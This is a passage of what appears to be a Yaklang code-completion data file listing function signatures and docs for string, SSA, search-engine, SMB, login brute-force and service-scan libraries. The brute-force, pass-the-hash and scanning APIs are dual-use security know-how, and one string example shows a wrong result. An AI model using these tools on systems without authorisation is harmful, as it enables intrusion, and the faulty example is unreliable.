              'Fields(s string) []string  doc:Fields 返回将字符串s按照空白字符（\'\\t\', \'\\n\', \'\\v\', \'\\f\', \'\\r\', \' \', 0x85, 0xA0）分割的字符串切片\n\nExample:\n```\nstr.Fields("hello world\\nhello yak\\tand\\vyakit") // [hello", "world", "hello", "yak", "and", "yakit"]\n```\n',
          },
          {
            functionName:
              "ExtractURLFromHTTPRequestRaw(${1:req /*type: []byte*/}, ${2:isHttps /*type: bool*/})",
            document: "",
            definitionStr:
              'ExtractURLFromHTTPRequestRaw(req []byte, isHttps bool) (*url.URL, error)  doc:ExtractURLFromHTTPRequestRaw 从原始 HTTP 请求报文中提取 URL，返回URL结构体与错误\n\nExample:\n```\nurl, err := str.ExtractURLFromHTTPRequestRaw(b"GET / HTTP/1.1\\r\\nHost: www.yaklang.com\\r\\n\\r\\n", false)\n```\n',
          },
          {
            functionName:
              "ExtractURLFromHTTPRequest(${1:r /*type: *http.Request*/}, ${2:https /*type: bool*/})",
            document: "",
            definitionStr:
              'ExtractURLFromHTTPRequest(r *http.Request, https bool) (*url.URL, error)  doc:ExtractURLFromHTTPRequest 从 HTTP 请求结构体中提取 URL，返回URL结构体与错误\n\nExample:\n```\nv, err = http.Raw("GET / HTTP/1.1\\r\\nHost: www.yaklang.com\\r\\n\\r\\n")\nurl, err = str.ExtractURLFromHTTPRequest(v, false)\n```\n',
          },
          {
            functionName: "ExtractTitle(${1:i})",
            document: "",
            definitionStr:
              'ExtractTitle(i any) string  doc:ExtractTitle 尝试将传入的字符串进行HTML解析并提取其中的标题(title标签)返回\n\nExample:\n```\nstr.ExtractTitle("hello yak") // ""\nstr.ExtractTitle("<title>hello yak</title>") // "hello yak"\n```\n',
          },
          {
            functionName:
              "ExtractStrContext(${1:raw /*type: string*/}, ${2:res /*type: []string*/})",
            document: "",
            definitionStr:
              'ExtractStrContext(raw string, res []string) []string  doc:ExtractStrContext 从字符串raw中提取一组关键字res上下文的内容，上下文的长度是512个字符确定。\n\nExample:\n```\nstr.ExtractStrContext("hello yak", ["hello"]) // ["hello yak"]\n```\n',
          },
          {
            functionName: "ExtractRootDomain(${1:i})",
            document: "",
            definitionStr:
              'ExtractRootDomain(i any) []string  doc:ExtractRootDomain 尝试提取字符串中的根域名并返回\n\nExample:\n```\nstr.ExtractRootDomain("hello yak") // []\nstr.ExtractRootDomain("hello www.yaklang.com or www.yaklang.io") // ["yaklang.com", "yaklang.io"]\n```\n',
          },
          {
            functionName: "ExtractJsonWithRaw(${1:i})",
            document: "",
            definitionStr:
              'ExtractJsonWithRaw(i any) ([]string, []string)  doc:ExtractJsonWithRaw 尝试提取字符串中的 JSON 并返回，第一个返回值返回经过修复后的JSON字符串数组，第二个返回值返回原始JSON字符串数组(如果修复失败)\n\nExample:\n```\nstr.ExtractJsonWithRaw("hello yak") // [], []\nstr.ExtractJsonWithRaw(`{"hello": "yak"}`) // [{"hello": "yak"}], []\n```\n',
          },
          {
            functionName: "ExtractJson(${1:i})",
            document: "",
            definitionStr:
              'ExtractJson(i any) []string  doc:ExtractJson 尝试提取字符串中的 JSON 并进行修复返回\n\nExample:\n```\nstr.ExtractJson("hello yak") // []\nstr.ExtractJson(`{"hello": "yak"}`) // [{"hello": "yak"}]\n```\n',
          },
          {
            functionName: "ExtractHostPort(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              'ExtractHostPort(raw string) string  doc:ExtractHostPort 尝试从字符串中解析出host和port，并返回host:port\n\nExample:\n```\nstr.ExtractHostPort("https://127.0.0.1:8888") // 127.0.0.1:8888\nstr.ExtractHostPort("https://baidu.com") // 127.0.0.1:443\n```\n',
          },
          {
            functionName: "ExtractHost(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              'ExtractHost(raw string) string  doc:ExtractHost 尝试从字符串中解析出host和port，并返回host\n\nExample:\n```\nstr.ExtractHost("127.0.0.1:8888") // 127.0.0.1\nstr.ExtractHost("https://example.com") // example.com\n```\n',
          },
          {
            functionName: "ExtractDomain(${1:i}, ${2:tryDecode...})",
            document: "",
            definitionStr:
              'ExtractDomain(i any, tryDecode ...bool) []string  doc:ExtractDomain 尝试提取字符串中的域名并返回，后续可以接收一个 tryDecode 参数，如果传入 true，则会尝试对输入的文本进行解码(双重URL编码，URL编码，unicode编码，quoted编码)\n\nExample:\n```\nstr.ExtractDomain("hello yak") // []\nstr.ExtractDomain("hello yaklang.com or yaklang.io") // ["yaklang.com", "yaklang.io"]\nstr.ExtractDomain(`{"message:"%79%61%6b%6c%61%6e%67.com"}`, true) // ["yaklang.com"]\n```\n',
          },
          {
            functionName: "ExtractChineseIDCards(${1:i})",
            document: "",
            definitionStr:
              'ExtractChineseIDCards(i any) []string  doc:ExtractChineseIDCards 尝试将传入的参数转换为字符串，然后提取字符串中的身份证号\n\nExample:\n```\nstr.ExtractChineseIDCards("Your ChineseID is: 110101202008027420?") // ["110101202008027420"]\n```\n',
          },
          {
            functionName:
              "ExtractBodyFromHTTPResponseRaw(${1:res /*type: []byte*/})",
            document: "",
            definitionStr:
              'ExtractBodyFromHTTPResponseRaw(res []byte) ([]byte, error)  doc:ExtractBodyFromHTTPResponseRaw 从原始 HTTP 响应报文中提取 body\n\nExample:\n```\nbody, err = str.ExtractBodyFromHTTPResponseRaw(b"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nok") // body = b"ok"\n```\n',
          },
          {
            functionName:
              "EqualFold(${1:s /*type: string*/}, ${2:t /*type: string*/})",
            document: "",
            definitionStr:
              'EqualFold(s string, t string) bool  doc:EqualFold 判断字符串s和t是否相等，忽略大小写\n\nExample:\n```\nstr.EqualFold("hello Yak", "HELLO YAK") // true\n```\n',
          },
          {
            functionName:
              "EndsWith(${1:s /*type: string*/}, ${2:suffix /*type: string*/})",
            document: "",
            definitionStr:
              'EndsWith(s string, suffix string) bool  doc:EndsWith / HasSuffix 判断字符串s是否以suffix结尾\n\nExample:\n```\nstr.EndsWith("Hello Yak", "Yak") // true\nstr.EndsWith("Hello Yak", "Hello") // false\n```\n',
          },
          {
            functionName:
              "CutSuffix(${1:s /*type: string*/}, ${2:suffix /*type: string*/})",
            document: "",
            definitionStr:
              "CutSuffix(s string, suffix string) (before string, found bool)  doc:CutSuffix returns s without the provided ending suffix string\nand reports whether it found the suffix.\nIf s doesn't end with suffix, CutSuffix returns s, false.\nIf suffix is the empty string, CutSuffix returns s, true.\n",
          },
          {
            functionName:
              "CutPrefix(${1:s /*type: string*/}, ${2:prefix /*type: string*/})",
            document: "",
            definitionStr:
              "CutPrefix(s string, prefix string) (after string, found bool)  doc:CutPrefix returns s without the provided leading prefix string\nand reports whether it found the prefix.\nIf s doesn't start with prefix, CutPrefix returns s, false.\nIf prefix is the empty string, CutPrefix returns s, true.\n",
          },
          {
            functionName:
              "Cut(${1:s /*type: string*/}, ${2:sep /*type: string*/})",
            document: "",
            definitionStr:
              'Cut(s string, sep string) (before string, after string, found bool)  doc:Cut slices s around the first instance of sep,\nreturning the text before and after sep.\nThe found result reports whether sep appears in s.\nIf sep does not appear in s, cut returns s, "", false.\n',
          },
          {
            functionName:
              "Count(${1:s /*type: string*/}, ${2:substr /*type: string*/})",
            document: "",
            definitionStr:
              'Count(s string, substr string) int  doc:Count 返回字符串s中substr出现的次数\n\nExample:\n```\nstr.Count("hello yak", "l") // 2\n```\n',
          },
          {
            functionName:
              "ContainsAny(${1:s /*type: string*/}, ${2:chars /*type: string*/})",
            document: "",
            definitionStr:
              'ContainsAny(s string, chars string) bool  doc:ContainsAny 判断字符串s是否包含chars中的任意字符\n\nExample:\n```\nstr.ContainsAny("hello yak", "ly") // true\nstr.ContainsAny("hello yak", "m") // false\n```\n',
          },
          {
            functionName:
              "Contains(${1:s /*type: string*/}, ${2:substr /*type: string*/})",
            document: "",
            definitionStr:
              'Contains(s string, substr string) bool  doc:Contains 判断字符串s是否包含substr\n\nExample:\n```\nstr.Contains("hello yakit", "yak") // true\n```\n',
          },
          {
            functionName:
              "Compare(${1:a /*type: string*/}, ${2:b /*type: string*/})",
            document: "",
            definitionStr:
              'Compare(a string, b string) int  doc:Compare 按照ascii码表顺序逐个比较字符串a和b中的每个字符，如果a==b，则返回0，如果a<b，则返回-1，如果a>b，则返回1\n\nExample:\n```\nstr.Compare("hello yak", "hello yak") // 0\nstr.Compare("hello yak", "hello") // 1\nstr.Compare("hello", "hello yak") // -1\n```\n',
          },
          {
            functionName: "CalcTextMaxSubStrStability(${1:raw...})",
            document: "",
            definitionStr:
              'CalcTextMaxSubStrStability(raw ...[]byte) (float64, error)  doc:CalcTextMaxSubStrStability 使用文本子串匹配算法计算多段文本之间的相似度，返回相似度与错误\n\nExample:\n```\np, err = str.CalcTextMaxSubStrStability("hello", "hello world") // p = 0.625\n```\n',
          },
          {
            functionName: "CalcSimilarity(${1:raw...})",
            document: "",
            definitionStr:
              'CalcSimilarity(raw ...[]byte) float64  doc:CalcSimilarity 计算多段文本之间的相似度，根据最长的文本长度选择不同的算法\n\n如果最长的文本长度小于等于 2000，使用文本子串匹配算法\n\n如果最短的文本长度大于等于 30000，使用模糊哈希算法\n\n如果上述算法出现错误，则使用 SimHash 算法\n\nExample:\n```\nstr.CalcSimilarity("hello", "hello world") // 0.625\n```\n',
          },
          {
            functionName: "CalcSimHashStability(${1:req...})",
            document: "",
            definitionStr:
              'CalcSimHashStability(req ...[]byte) (float64, error)  doc:CalcSimHashStability 使用 SimHash 算法计算多段文本之间的相似度，返回相似度与错误。\n\nExample:\n```\np, err = str.CalcSimHashStability("hello", "hello world") // p = 0.96484375\n```\n',
          },
          {
            functionName: "CalcSimHash(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              'CalcSimHash(raw []byte) uint64  doc:CalcSimHash 计算并返回一段文本的 SimHash 值\n\nExample:\n```\nstr.CalcSimHash("hello")\n```\n',
          },
          {
            functionName: "CalcSSDeepStability(${1:req...})",
            document: "",
            definitionStr:
              "CalcSSDeepStability(req ...[]byte) (float64, error)  doc:CalcSSDeepStability 使用模糊哈希算法计算多段文本之间的相似度，返回相似度与错误。传入的文本应该为大文本，即长度大于 30 kb。\n\nExample:\n```\np, err = str.CalcSSDeepStability(str.RandStr(100000), str.RandStr(100000))\n```\n",
          },
          {
            functionName: "CalcSSDeep(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              'CalcSSDeep(raw []byte) string  doc:CalcSSDeep 计算并返回一段文本的模糊哈希值\n\nExample:\n```\nstr.CalcSSDeep("hello")\n```\n',
          },
        ],
      },
      {
        libName: "ssa",
        prefix: "ssa.",
        functions: [
          {
            functionName: "withStrictMode(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "withStrictMode(b bool) Option",
          },
          {
            functionName: "withSaveToProfile(${1:b...})",
            document: "",
            definitionStr: "withSaveToProfile(b ...bool) Option",
          },
          {
            functionName: "withReCompile(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "withReCompile(b bool) Option",
          },
          {
            functionName: "withProgramName(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              "withProgramName(name string) Option  doc:save to database, please set the program name\n",
          },
          {
            functionName: "withProcess(${1:process /*type: ProcessFunc*/})",
            document: "",
            definitionStr: "withProcess(process ProcessFunc) Option",
          },
          {
            functionName: "withLanguage(${1:input_language /*type: string*/})",
            document: "",
            definitionStr: "withLanguage(input_language string) Option",
          },
          {
            functionName: "withExternValue(${1:table /*type: map[string]any*/})",
            document: "",
            definitionStr: "withExternValue(table map[string]any) Option",
          },
          {
            functionName:
              "withExternLib(${1:name /*type: string*/}, ${2:table /*type: map[string]any*/})",
            document: "",
            definitionStr:
              "withExternLib(name string, table map[string]any) Option",
          },
          {
            functionName: "withEntryFile(${1:files...})",
            document: "",
            definitionStr: "withEntryFile(files ...string) Option",
          },
          {
            functionName: "withDescription(${1:desc /*type: string*/})",
            document: "",
            definitionStr: "withDescription(desc string) Option",
          },
          {
            functionName: "withDatabasePath(${1:path /*type: string*/})",
            document: "",
            definitionStr: "withDatabasePath(path string) Option",
          },
          {
            functionName: "withContext(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr: "withContext(ctx context.Context) Option",
          },
          {
            functionName: "Yak",
            document: "ssa.Yak: consts.Language",
            definitionStr: "ssa.Yak: consts.Language",
          },
          {
            functionName:
              "ParseLocalProject(${1:path /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "ParseLocalProject(path string, opts ...Option) (Programs, error)",
          },
          {
            functionName: "Parse(${1:code /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr: "Parse(code string, opts ...Option) (*Program, error)",
          },
          {
            functionName: "PHP",
            document: "ssa.PHP: consts.Language",
            definitionStr: "ssa.PHP: consts.Language",
          },
          {
            functionName: "Javascript",
            document: "ssa.Javascript: consts.Language",
            definitionStr: "ssa.Javascript: consts.Language",
          },
          {
            functionName: "Java",
            document: "ssa.Java: consts.Language",
            definitionStr: "ssa.Java: consts.Language",
          },
        ],
      },
      {
        libName: "spacengine",
        prefix: "spacengine.",
        functions: [
          {
            functionName: "zoomeye(${1:api...})",
            document: "",
            definitionStr: "zoomeye(api ...string) _spaceEngineConfigOpt",
          },
          {
            functionName: "shodan(${1:api...})",
            document: "",
            definitionStr: "shodan(api ...string) _spaceEngineConfigOpt",
          },
          {
            functionName: "quake(${1:api...})",
            document: "",
            definitionStr: "quake(api ...string) _spaceEngineConfigOpt",
          },
          {
            functionName: "pageSize(${1:i /*type: int*/})",
            document: "",
            definitionStr: "pageSize(i int) _spaceEngineConfigOpt",
          },
          {
            functionName: "maxRecord(${1:i /*type: int*/})",
            document: "",
            definitionStr: "maxRecord(i int) _spaceEngineConfigOpt",
          },
          {
            functionName: "maxPage(${1:i /*type: int*/})",
            document: "",
            definitionStr: "maxPage(i int) _spaceEngineConfigOpt",
          },
          {
            functionName: "hunter(${1:auth...})",
            document: "",
            definitionStr: "hunter(auth ...string) _spaceEngineConfigOpt",
          },
          {
            functionName: "fofa(${1:auth...})",
            document: "",
            definitionStr: "fofa(auth ...string) _spaceEngineConfigOpt",
          },
          {
            functionName: "engine(${1:i /*type: string*/}, ${2:auth...})",
            document: "",
            definitionStr:
              "engine(i string, auth ...string) _spaceEngineConfigOpt",
          },
          {
            functionName: "domain(${1:domain /*type: string*/})",
            document: "",
            definitionStr: "domain(domain string) _spaceEngineConfigOpt",
          },
          {
            functionName:
              "ZoomeyeQuery(${1:key /*type: string*/}, ${2:filter /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              "ZoomeyeQuery(key string, filter string, opts ..._spaceEngineConfigOpt) (chan *base.NetSpaceEngineResult, error)",
          },
          {
            functionName:
              "ShodanQuery(${1:token /*type: string*/}, ${2:filter /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              "ShodanQuery(token string, filter string, opts ..._spaceEngineConfigOpt) (chan *base.NetSpaceEngineResult, error)",
          },
          {
            functionName: "Query(${1:filter /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "Query(filter string, opts ..._spaceEngineConfigOpt) (chan *base.NetSpaceEngineResult, error)",
          },
          {
            functionName:
              "QuakeQuery(${1:token /*type: string*/}, ${2:filter /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              "QuakeQuery(token string, filter string, opts ..._spaceEngineConfigOpt) (chan *base.NetSpaceEngineResult, error)",
          },
          {
            functionName:
              "HunterQuery(${1:name /*type: string*/}, ${2:key /*type: string*/}, ${3:filter /*type: string*/}, ${4:opts...})",
            document: "",
            definitionStr:
              "HunterQuery(name string, key string, filter string, opts ..._spaceEngineConfigOpt) (chan *base.NetSpaceEngineResult, error)",
          },
          {
            functionName:
              "FofaQuery(${1:email /*type: string*/}, ${2:key /*type: string*/}, ${3:filter /*type: string*/}, ${4:opts...})",
            document: "",
            definitionStr:
              "FofaQuery(email string, key string, filter string, opts ..._spaceEngineConfigOpt) (chan *base.NetSpaceEngineResult, error)",
          },
        ],
      },
      {
        libName: "smb",
        prefix: "smb.",
        functions: [
          {
            functionName: "workstation(${1:w /*type: string*/})",
            document: "",
            definitionStr: "workstation(w string) _smbConfigHandler",
          },
          {
            functionName: "username(${1:user /*type: string*/})",
            document: "",
            definitionStr: "username(user string) _smbConfigHandler",
          },
          {
            functionName: "password(${1:pass /*type: string*/})",
            document: "",
            definitionStr: "password(pass string) _smbConfigHandler",
          },
          {
            functionName: "hash(${1:w /*type: string*/})",
            document: "",
            definitionStr: "hash(w string) _smbConfigHandler",
          },
          {
            functionName: "domain(${1:w /*type: string*/})",
            document: "",
            definitionStr: "domain(w string) _smbConfigHandler",
          },
          {
            functionName: "debug(${1:w /*type: bool*/})",
            document: "",
            definitionStr: "debug(w bool) _smbConfigHandler",
          },
          {
            functionName: "Connect(${1:addr /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "Connect(addr string, opts ..._smbConfigHandler) (*smb.Session, error)",
          },
        ],
      },
      {
        libName: "simulator",
        prefix: "simulator.",
        functions: [
          {
            functionName: "wsAddress(${1:ws /*type: string*/})",
            document: "",
            definitionStr: "wsAddress(ws string) BruteConfigOpt",
          },
          {
            functionName: "usernameSelector(${1:selector /*type: string*/})",
            document: "",
            definitionStr: "usernameSelector(selector string) BruteConfigOpt",
          },
          {
            functionName: "usernameList(${1:username /*type: []string*/})",
            document: "",
            definitionStr: "usernameList(username []string) BruteConfigOpt",
          },
          {
            functionName: "username(${1:username...})",
            document: "",
            definitionStr: "username(username ...string) BruteConfigOpt",
          },
          {
            functionName: "urlChangeMode",
            document: "simulator.urlChangeMode: simulator.loginDetectMode",
            definitionStr: "simulator.urlChangeMode: simulator.loginDetectMode",
          },
          {
            functionName: "submitButtonSelector(${1:selector /*type: string*/})",
            document: "",
            definitionStr: "submitButtonSelector(selector string) BruteConfigOpt",
          },
          {
            functionName: "sourceType(${1:sourceType /*type: string*/})",
            document: "",
            definitionStr: "sourceType(sourceType string) BruteConfigOpt",
          },
          {
            functionName: "simple",
            document:
              "simulator.simple: map[string]interface {} = 0xmap[626f64794d6f64696679546172676574:626f6479 626f64795265706c616365546172676574:626f64795265706c616365 63726561746542726f77736572:7ff76cb27c20 686561646572734d6f64696679546172676574:68656164657273 686561646c657373:7ff76cb275e0 686f73744d6f64696679546172676574:686f7374 6e6f53616e64426f78:7ff76cb27560 70726f7879:7ff76cb273a0 726571756573744d6f64696679:7ff76cb27940 726573706f6e73654d6f64696679:7ff76cb27660 777341646472657373:7ff76cb272a0]",
            definitionStr:
              "simulator.simple: map[string]interface {} = 0xmap[626f64794d6f64696679546172676574:626f6479 626f64795265706c616365546172676574:626f64795265706c616365 63726561746542726f77736572:7ff76cb27c20 686561646572734d6f64696679546172676574:68656164657273 686561646c657373:7ff76cb275e0 686f73744d6f64696679546172676574:686f7374 6e6f53616e64426f78:7ff76cb27560 70726f7879:7ff76cb273a0 726571756573744d6f64696679:7ff76cb27940 726573706f6e73654d6f64696679:7ff76cb27660 777341646472657373:7ff76cb272a0]",
          },
          {
            functionName: "saveToDB(${1:saveToDB /*type: bool*/})",
            document: "",
            definitionStr: "saveToDB(saveToDB bool) BruteConfigOpt",
          },
          {
            functionName: "runtimeID(${1:runtimeID /*type: string*/})",
            document: "",
            definitionStr: "runtimeID(runtimeID string) BruteConfigOpt",
          },
          {
            functionName: "proxy(${1:proxy /*type: string*/}, ${2:details...})",
            document: "",
            definitionStr:
              "proxy(proxy string, details ...string) BruteConfigOpt",
          },
          {
            functionName: "preAction(${1:actionsJs /*type: string*/})",
            document: "",
            definitionStr: "preAction(actionsJs string) BruteConfigOpt",
          },
          {
            functionName: "passwordSelector(${1:selector /*type: string*/})",
            document: "",
            definitionStr: "passwordSelector(selector string) BruteConfigOpt",
          },
          {
            functionName: "passwordList(${1:password /*type: []string*/})",
            document: "",
            definitionStr: "passwordList(password []string) BruteConfigOpt",
          },
          {
            functionName: "password(${1:password...})",
            document: "",
            definitionStr: "password(password ...string) BruteConfigOpt",
          },
          {
            functionName:
              "loginDetectMode(${1:mode /*type: loginDetectMode*/}, ${2:degree...})",
            document: "",
            definitionStr:
              "loginDetectMode(mode loginDetectMode, degree ...float64) BruteConfigOpt",
          },
          {
            functionName: "leaklessStatus(${1:leakless /*type: LeaklessMode*/})",
            document: "",
            definitionStr: "leaklessStatus(leakless LeaklessMode) BruteConfigOpt",
          },
          {
            functionName: "leaklessOn",
            document: "simulator.leaklessOn: simulator.LeaklessMode",
            definitionStr: "simulator.leaklessOn: simulator.LeaklessMode",
          },
          {
            functionName: "leaklessOff",
            document: "simulator.leaklessOff: simulator.LeaklessMode",
            definitionStr: "simulator.leaklessOff: simulator.LeaklessMode",
          },
          {
            functionName: "leaklessDefault",
            document: "simulator.leaklessDefault: simulator.LeaklessMode",
            definitionStr: "simulator.leaklessDefault: simulator.LeaklessMode",
          },
          {
            functionName: "htmlChangeMode",
            document: "simulator.htmlChangeMode: simulator.loginDetectMode",
            definitionStr: "simulator.htmlChangeMode: simulator.loginDetectMode",
          },
          {
            functionName: "fromPlugin(${1:fromPlugin /*type: string*/})",
            document: "",
            definitionStr: "fromPlugin(fromPlugin string) BruteConfigOpt",
          },
          {
            functionName: "extraWaitLoadTime(${1:time /*type: int*/})",
            document: "",
            definitionStr: "extraWaitLoadTime(time int) BruteConfigOpt",
          },
          {
            functionName: "exePath(${1:exePath /*type: string*/})",
            document: "",
            definitionStr: "exePath(exePath string) BruteConfigOpt",
          },
          {
            functionName: "defaultChangeMode",
            document: "simulator.defaultChangeMode: simulator.loginDetectMode",
            definitionStr:
              "simulator.defaultChangeMode: simulator.loginDetectMode",
          },
          {
            functionName: "captchaUrl(${1:url /*type: string*/})",
            document: "",
            definitionStr: "captchaUrl(url string) BruteConfigOpt",
          },
          {
            functionName: "captchaType(${1:typeEnum /*type: int*/})",
            document: "",
            definitionStr: "captchaType(typeEnum int) BruteConfigOpt",
          },
          {
            functionName: "captchaMode(${1:mode /*type: string*/})",
            document: "",
            definitionStr: "captchaMode(mode string) BruteConfigOpt",
          },
          {
            functionName: "captchaInputSelector(${1:selector /*type: string*/})",
            document: "",
            definitionStr: "captchaInputSelector(selector string) BruteConfigOpt",
          },
          {
            functionName: "captchaImgSelector(${1:selector /*type: string*/})",
            document: "",
            definitionStr: "captchaImgSelector(selector string) BruteConfigOpt",
          },
          {
            functionName:
              "HttpBruteForce(${1:targetUrl /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "HttpBruteForce(targetUrl string, opts ...BruteConfigOpt) (chan Result, error)",
          },
        ],
      },
      {
        libName: "servicescan",
        prefix: "servicescan.",
        functions: [
          {
            functionName: "webRule(${1:rs...})",
            document: "",
            definitionStr:
              "webRule(rs ...any) ConfigOption  doc:webRule servicescan 的配置选项，设置本次扫描使用的 Web 指纹规则\n@param {interface{}} i Web 指纹规则\n",
          },
          {
            functionName: "web()",
            document: "",
            definitionStr: "web() fp.ConfigOption",
          },
          {
            functionName: "service()",
            document: "",
            definitionStr: "service() fp.ConfigOption",
          },
          {
            functionName: "proxy(${1:proxies...})",
            document: "",
            definitionStr:
              'proxy(proxies ...string) ConfigOption  doc:proxy servicescan 的配置选项，设置本次扫描使用的代理\n\n@param {string} proxies 代理地址，支持 http 和 socks5\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161", servicescan.proxy("http://127.0.0.1:1080"))\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "proto(${1:proto...})",
            document: "",
            definitionStr:
              'proto(proto ...any) fp.ConfigOption  doc:proto servicescan 的配置选项，用于指定扫描协议\n\n@param {...interface{}} [proto] 协议，例如：tcp、udp，可选参数，不传入参数默认为 tcp\n\n@return {ConfigOption} 返回配置选项\n\nExample:\n```\nresult,err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161", servicescan.proto(["tcp","udp"]...)) // 使用 TCP 和 UDP 进行扫描\ndie(err) // 如果错误非空则报错\nfor res := range result { // 通过遍历管道的形式获取管道中的结果，一旦有结果返回就会执行循环体的代码\n\n\t   println(res.String()) // 输出结果，调用String方法获取可读字符串\n\t}\n\n```\n',
          },
          {
            functionName: "probeTimeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr:
              'probeTimeout(f float64) ConfigOption  doc:probeTimeout servicescan 的配置选项，设置每一个探测包的超时时间\n\n@param {float64} f 超时时间，单位为秒\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161", servicescan.probeTimeout(5))\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "nmapRule(${1:i})",
            document: "",
            definitionStr:
              "nmapRule(i any) ConfigOption  doc:nmapRule servicescan 的配置选项，设置本次扫描使用的 Nmap 指纹规则\n@param {interface{}} i Nmap 指纹规则\n",
          },
          {
            functionName: "nmapRarityMax(${1:rarity /*type: int*/})",
            document: "",
            definitionStr:
              'nmapRarityMax(rarity int) ConfigOption  doc:nmapRarityMax servicescan 的配置选项，设置本次扫描使用的 Nmap 指纹稀有度，在主动模式发包的基础上进行探测控制\n\n稀有度越大，表示这个服务在现实存在的可能性越小，取值范围为 1-9，默认值为 5\n\n@param {int} rarity 稀有度，取值范围为 1-9\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161",\nservicescan.active(true), // 需要在主动发包的基础上通过稀有度进行筛选\nservicescan.nmapRarityMax(9),\n)\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "maxProbesConcurrent(${1:m /*type: int*/})",
            document: "",
            definitionStr:
              'maxProbesConcurrent(m int) ConfigOption  doc:maxProbesConcurrent servicescan 的配置选项，设置本次扫描发送 Probe 的并发量，默认值为 5\n\n@param {int} m 并发量\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161",\nservicescan.active(true), // 需要在主动发包的基础上\nservicescan.maxProbes(50), // 设置本次扫描使用的最大探测包数量\nservicescan.maxProbesConcurrent(10) // 设置本次扫描发送 Probe 的并发量\n)\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "maxProbes(${1:m /*type: int*/})",
            document: "",
            definitionStr:
              'maxProbes(m int) ConfigOption  doc:maxProbes servicescan 的配置选项，在主动模式发包的基础上设置本次扫描使用的最大探测包数量，默认值为 5\n\n@param {int} m 最大探测包数量\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161",\nservicescan.active(true), // 需要在主动发包的基础上\nservicescan.maxProbes(10)\n)\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "excludePorts(${1:ports /*type: string*/})",
            document: "",
            definitionStr:
              'excludePorts(ports string) ConfigOption  doc:excludePorts servicescan 的配置选项，设置本次扫描排除的端口\n\n@param {string} ports 端口，支持逗号分割、-的格式\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161", servicescan.excludePorts("22,80"))\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "excludeHosts(${1:hosts /*type: string*/})",
            document: "",
            definitionStr:
              'excludeHosts(hosts string) ConfigOption  doc:excludeHosts servicescan 的配置选项，设置本次扫描排除的主机\n\n@param {string} hosts 主机，支持逗号分割、CIDR、-的格式\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("192.168.1.1/24", "22-80,443,3389", servicescan.excludeHosts("192.168.1.1"))\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "disableDefaultRule(${1:b...})",
            document: "",
            definitionStr: "disableDefaultRule(b ...bool) fp.ConfigOption",
          },
          {
            functionName: "databaseCache(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'databaseCache(b bool) ConfigOption  doc:databaseCache servicescan 的配置选项，设置本次扫描是否使用数据库缓存\n\n@param {bool} b 是否使用数据库缓存\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161", servicescan.databaseCache(true))\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "concurrent(${1:size /*type: int*/})",
            document: "",
            definitionStr:
              'concurrent(size int) ConfigOption  doc:concurrent servicescan 的配置选项，用于设置整体扫描并发\n\n@param {int} size 并发数量\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161", servicescan.concurrent(100))\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "cache(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'cache(b bool) ConfigOption  doc:cache servicescan 的配置选项，设置本次扫描是否使用缓存\n\n@param {bool} b 是否使用缓存\n\n@return {ConfigOption} 返回配置项\n\nExample:\n```\nresult, err = servicescan.Scan("127.0.0.1", "22-80,443,3389,161", servicescan.cache(true))\ndie(err)\n\n\tfor v := range result {\n\t\tfmt.Println(v.String())\n\t}\n\n```\n',
          },
          {
            functionName: "all()",
            document: "",
            definitionStr: "all() fp.ConfigOption",
          },
          {
            functionName: "active(${1:raw /*type: bool*/})",
